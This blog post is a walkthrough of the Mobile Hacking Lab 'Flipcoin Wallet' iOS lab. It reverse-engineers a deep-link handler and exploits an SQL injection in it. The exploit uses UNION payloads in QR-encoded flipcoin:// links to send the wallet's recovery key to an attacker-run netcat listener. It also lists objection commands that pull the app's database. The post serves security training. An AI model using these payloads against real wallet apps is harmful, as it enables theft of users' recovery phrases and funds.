---
layout: post
title: Flipcoin Wallet - Mobile Hacking Lab
color: rgb(51,122,183)
tags: [Mobile Hacking lab, iOS Security]
comments: true
share: false
excerpt_separator: <!--more-->
---

The [Flipcoin Wallet](https://www.mobilehackinglab.com/course/lab-flipcoin-wallet) lab aims to explore a vulnerability known as SQL Injection (SQLi) within an iOS application to demonstrate how sensitive data, such as recovery phrases, can be compromised. <!--more--> In this article, we will guide you through the process of understanding the application's functionality and exploiting the SQL injection vulnerability to steal the recovery phrase of a victim.

### Introduction

Upon opening the application, users encounter a platform facilitating cryptocurrency transactions, including buying, receiving, and sending cryptos, alongside the latest news and a list of balances of all cryptocurrencies. Since there isn't much apparent from the perspective of stealing the recovery phase, let's delve into the code to discover how we can achieve this.

### Static Analysis

The first step is to look into the `Info.plist`, where we find useful information for interacting with the application.

```xml
<!--Info.plist-->
<array>
    <dict>
        <key>CFBundleTypeRole</key>
        <string>Editor</string>
        <key>CFBundleURLName</key>
        <string>com.mobilehackinglab.flipcoinwallet</string>
        <key>CFBundleURLSchemes</key>
        <array>
            <string>flipcoin</string>
        </array>
    </dict>
</array>
```

We observe that the application implements a schema that allows deep linking, enabling actions such as opening the application via a QR code. The deep link format should be `flipcoin://data`. To comprehend the functionality associated with this schema, we need to delve into the code using Ghidra.

After exploring the code, we find this gigantic function: `_$s15Flipcoin_Wallet13SceneDelegateC5scene_15openURLContextsySo7UISceneC_ShySo16UIOpenURLContextCGtF`. Looking into the code, this function handles the opening of the app via deep link and has two interesting parts: the query parameters `amount` and `testnet`.

The `amount` parameter allows the user to choose a value to send the crypto to another person, and the `testnet` parameter is used to send a request with some data to a website passed into this. For the `testnet` parameter, if not passed, the default value will be `https://mhl.pages.dev:8545`.

```c
//_$s15Flipcoin_Wallet13SceneDelegateC5scene_15openURLContextsySo7UISceneC_ShySo16UIOpenURLConte xtCGtF
...

local_6d8 = auVar34._8_8_;
local_6e8 = auVar34._0_8_;
puVar24 = unaff_x20;
(*local_4c0)(lVar2,lVar20);
(*local_4c0)(lVar9,lVar20);
local_6ac = 1;
auVar34 = _$sSS21_builtinStringLiteral17utf8CodeUnitCount7isASCIISSBp_BwBi1_tcfC
                    ("amount",6,1);
local_6e0 = auVar34._8_8_;
auVar34 = (**(code **)((*unaff_x20 & *(ulong *)puVar12) + 0x98))
                    (local_6e8,local_6d8,auVar34._0_8_);
local_6c8 = auVar34;
_swift_bridgeObjectRelease(local_6e0);
_swift_bridgeObjectRelease(local_6d8);
_objc_release(local_6d0);
local_108._0_16_ = local_6c8;
_objc_msgSend(local_4d8,local_6b8[0x39]);
local_690 = _objc_retainAutoreleasedReturnValue();
_$s10Foundation3URLV36_unconditionallyBridgeFromObjectiveCyACSo5NSURLCSgFZ();
(*local_4c8)(lVar2,lVar9,lVar20);
auVar34 = _$s10Foundation3URLV14absoluteStringSSvg();
local_698 = auVar34._8_8_;
local_6a8 = auVar34._0_8_;
unaff_x20 = puVar24;
(*local_4c0)(lVar2,lVar20);
(*local_4c0)(lVar9,lVar20);
auVar34 = _$sSS21_builtinStringLiteral17utf8CodeUnitCount7isASCIISSBp_BwBi1_tcfC
                    ("testnet",7,local_6ac & 1);
local_6a0 = auVar34._8_8_;
auVar34 = (**(code **)((*puVar24 & *(ulong *)puVar12) + 0x98))
                    (local_6a8,local_698,auVar34._0_8_);
local_688._0_16_ = auVar34;
_swift_bridgeObjectRelease(local_6a0);
_swift_bridgeObjectRelease(local_698);
_objc_release(local_690);
_swift_bridgeObjectRetain(local_688._8_8_);
...

```

To test this functionality, let's generate a QR code to verify if we can open the application with the values passed.
```bash
qrencode "flipcoin://0x252B2Fff0d264d946n1004E581bb0a46175DC009?amount=0.0003&testnet=http://192.168.0.122" -o test.png
```

To host a web server on your computer:
```
nc -lv -p 80
```

Upon scanning the generated QR code, we can observe the desired amount on the screen for cryptocurrency transfer and a `POST`  request to the specified website via the `testnet` parameter, containing the following content:

```json
//Response received in webserver
{
"jsonrpc":"2.0",
"method":"web3_sha3",
"params":
    [
        "0x252B2Fff0d264d946n1004E581bb0a46175DC009",
        "111120a58098a188ff60e0949d3102e9cc38b61701065c72f8aed205e76f245e"
    ],
"id":1
}
```

This response reveals the account address. However, our objective is to retrieve the `recover_key`. To achieve this, let's further explore the reverse engineering of the app. In Ghidra, we can identify that the app writes to an SQLite database named `your_database_name.sqlite`.

```c
undefined  [16] _$s15Flipcoin_Wallet14DatabaseHelperC6dbPathSSvg(void)
{
  ...
  
  local_f0 = "Fatal error";
  local_e8 = "Unexpectedly found nil while unwrapping an Optional value";
  local_e0 = "Flipcoin_Wallet/DatabaseHelper.swift";
  local_50._0_8_ = 0;
  local_50._8_8_ = 0;
  lVar5 = ___swift_instantiateConcreteTypeFromMangledName((long *)&_$s10Foundation3URLVSgMD);
  local_d8 = *(long *)(*(long *)(lVar5 + -8) + 0x40) + 0xfU & 0xfffffffffffffff0;
  (*(code *)PTR____chkstk_darwin_1000281d0)();
  lVar5 = (long)&local_110 - local_d8;
  local_60 = lVar5;
  local_58 = _$s10Foundation3URLVMa(0);
  local_68 = *(long *)(local_58 + -8);
  local_d0 = *(long *)(local_68 + 0x40) + 0xfU & 0xfffffffffffffff0;
  (*(code *)PTR____chkstk_darwin_1000281d0)();
  lVar5 = lVar5 - local_d0;
  local_c0 = extraout_x8 + 0xfU & 0xfffffffffffffff0;
  local_c8 = lVar5;
  (*(code *)PTR____chkstk_darwin_1000281d0)();
  lVar5 = lVar5 - local_c0;
  local_b0 = extraout_x8_00 + 0xfU & 0xfffffffffffffff0;
  local_b8 = lVar5;
  (*(code *)PTR____chkstk_darwin_1000281d0)();
  lVar5 = lVar5 - local_b0;
  local_a0 = 1;
  ___profc_$s15Flipcoin_Wallet14DatabaseHelperC6dbPathSSvg =
       ___profc_$s15Flipcoin_Wallet14DatabaseHelperC6dbPathSSvg + 1;
  local_a8 = lVar5;
  uVar6 = _objc_opt_self(&_OBJC_CLASS_$_NSFileManager);
  _objc_msgSend(uVar6,"defaultManager");
  local_98 = _objc_retainAutoreleasedReturnValue();
  _objc_msgSend(local_98,"URLsForDirectory:inDomains:",9,local_a0);
  local_90 = _objc_retainAutoreleasedReturnValue();
  _objc_release(local_98);
  local_88 = _$sSa10FoundationE36_unconditionallyBridgeFromObjectiveCySayxGSo7NSArrayCSgFZ
                       (local_90,local_58);
  local_70 = local_88;
  local_38 = local_88;
  _swift_bridgeObjectRetain();
  local_78 = &local_40;
  local_40 = local_88;
  local_80 = ___swift_instantiateConcreteTypeFromMangledName((long *)&_$sSay10Foundation3URLVGMD) ;
  lVar7 = _$sSay10Foundation3URLVGSayxGSlsWl();
  _$sSlsE5first7ElementQzSgvg(local_80,lVar7);
  _$sSay10Foundation3URLVGWOh(local_78);
  _swift_bridgeObjectRelease(local_70);
  iVar4 = (**(code **)(local_68 + 0x30))(local_60,1,local_58);
  pcVar3 = local_e0;
  pcVar2 = local_e8;
  pcVar1 = local_f0;
  if (iVar4 == 1) {
    *(undefined *)(lVar5 + -0x20) = 2;
    *(undefined8 *)(lVar5 + -0x18) = 0x1a;
    *(undefined4 *)(lVar5 + -0x10) = 0;
    _$ss17_assertionFailure__4file4line5flagss5NeverOs12StaticStringV_A2HSus6UInt32VtF
              (pcVar1,0xb,2,pcVar2,0x39,2,pcVar3,0x24);
                    /* WARNING: Treating indirect jump as call */
    UNRECOVERED_JUMPTABLE = (code *)SoftwareBreakpoint(1,0x10000e65c);
    auVar8 = (*UNRECOVERED_JUMPTABLE)();
    return auVar8;
  }
  (**(code **)(local_68 + 0x20))(local_a8,local_60,local_58);
  _objc_release(local_90);
  _$sSS21_builtinStringLiteral17utf8CodeUnitCount7isASCIISSBp_BwBi1_tcfC
            ("your_database_name.sqlite",0x19,1);
  local_110 = extraout_x1;
  _$s10Foundation3URLV22appendingPathComponentyACSSF();
  lVar5 = local_c8;
  _swift_bridgeObjectRelease(local_110);
  (**(code **)(local_68 + 0x10))(lVar5,local_b8,local_58);
  local_100 = _$s10Foundation3URLV4pathSSvg();
  local_108 = *(code **)(local_68 + 8);
  local_50 = local_100;
  (*local_108)(local_c8,local_58);
  (*local_108)(local_b8,local_58);
  _swift_bridgeObjectRetain(local_100._8_8_);
  _swift_bridgeObjectRelease(local_100._8_8_);
  (*local_108)(local_a8,local_58);
  return local_100;
}
```

Using objection, we retrieve this SQL database with the following commands:
```bash
objection -psn  com.mobilehackinglab.Flipcoin-Wallet6 start
env #get the DocumentDirectory and cd into it
cd /var/mobile/Containers/Data/Application/C769F80D-B192-49E6-BDA7-A7EBDC77CE2C/Documents
file download your_database_name.sqlite
```

Now, upon opening this file, we can see that we have a table called `wallet` with 5 parameters: `id`, `address`, `amount`, `currency`, `recover_key`.

So how can we get this `recover_key` on our server? Looking again into the `_$s15Flipcoin_Wallet13SceneDelegateC5scene_15openURLContextsySo7UISceneC_ShySo16UIOpenURLContextCGtF` function, we can see an SQL injection in the following line:

```c
//_$s15Flipcoin_Wallet13SceneDelegateC5scene_15openURLContextsySo7UISceneC_ShySo16UIOpenURLContextCGtF
...

local_190 = auVar34;
_$sSS21_builtinStringLiteral17utf8CodeUnitCount7isASCIISSBp_BwBi1_tcfC
            ("WHERE amount >",0xe,1);
local_758 = extraout_x1_01;
_$ss26DefaultStringInterpolationV13appendLiteralyySSF();
_swift_bridgeObjectRelease(local_758);
_swift_bridgeObjectRetain(local_6c8._8_8_);

...
```

This line accepts user input without proper sanitization, leaving it vulnerable to SQL injection.

### Exploiting the app

Let's generate a QR code with the deep link to confirm our injection:

```
flipcoin://0x252B2Fff0d264d946n1004E581bb0a46175DC009?amount=0.0003/**/AND/**/id=2;--&testnet=http://192.168.0.122
```

Using this when scanning the QR code, we obtain a different `address` on the server, confirming our SQL injection. Now, how can we change the field to appear so that instead of being the `address`, it's the `recover_key`? For this, we can use a [SQL injection Union attack](https://portswigger.net/web-security/sql-injection/union-attacks).

To explore this, let's create a QR code with a deep link with a Union Attack with the following text:
```
flipcoin://0x252B2Fff0d264d946n1004E581bb0a46175DC009?amount=0.0003/**/UNION/**/SELECT/**/1,2,3,4,5/**/LIMIT/**/1;--&testnet=http://192.168.0.122
```

Scanning the QR code, we get on our server the value 2, meaning that the query has 5 members in the select and we can inject on the number 2.
```json
//Response received in webserver
{
    "jsonrpc":"2.0"
    ,"method":"web3_sha3",
    "params":[
    "2", 
    "d4735e3a265e16eee03f59718b9b5d03019c07d8b6c51f90da3a666eec13ab35"
    ],
    "id":1
}
```

Now, we just need to adapt our payload to retrieve the flag:
```
flipcoin://0x252B2Fff0d264d946n1004E581bb0a46175DC009?amount=0.0003/**/AND/**/id=10/**/UNION/**/SELECT/**/10,(SELECT/**/recovery_key/**/FROM/**/wallet),3,4,5/**/LIMIT/**/1;--&testnet=http://192.168.0.122
```

Inside the value 2, we do another select to get the `recover_key`, and this will be displayed on your server.

```json
//Response received in webserver
{
    "jsonrpc":"2.0",
    "method":"web3_sha3",
    "params":
        [
            "FLAG{fl1p_d4_c01nz}}",
            "7da50a3fe76ad0ea1de171ec47042ce913235c3792628a779f6acc5b07bebd90"
        ],
    "id":1
}
```

### Conclusion

This lab demonstrates an SQL injection flaw within an iOS application and how using deep links without user input validation can lead to the theft of sensitive data. For a hands-on experience with these concepts, visit the [MobileHackingLab - Flipcoin Wallet](https://www.mobilehackinglab.com/course/lab-flipcoin-wallet) and embark on a journey of discovery to enhance your skills in mobile security.